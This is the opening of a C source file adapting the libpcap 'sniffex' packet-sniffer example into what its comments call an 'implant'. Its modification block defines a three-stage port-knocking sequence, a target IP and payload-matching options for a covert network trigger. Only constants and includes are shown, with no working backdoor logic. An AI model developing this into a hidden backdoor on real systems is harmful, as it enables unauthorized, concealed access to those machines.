
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <signal.h>


#define APP_NAME		"sniffex"
#define APP_DESC		"Sniffer example using libpcap"
#define APP_COPYRIGHT	"Copyright (c) 2005 The Tcpdump Group"
#define APP_DISCLAIMER	"THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM."



/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6





// -----------------------------  M Y   M O D I F I C A T I O N S  ----------------------------------



// the target port knocking port
#define KNOCK_1 	(int[]) {1336,0}
#define KNOCK_2     (int[]) {1337, 1338, 1339, 0}
#define KNOCK_3     (int[]) {13337, 0}

// number of knocking states to keep track of
#define NUM_STATES  3

// valid ip address to run this implant on
#define VALID_IP "127.0.1.1"

// number of packets to look for
#define NUM_PACKETS 10


// for handling signal interrupts
#define SIGINT 2


// bytes in payload to check against
// #define TARGET_STR "qwerty"

// if defined, we will print this number of bytes in the payload after the target string
// #define PAYLOAD_SIZE 8
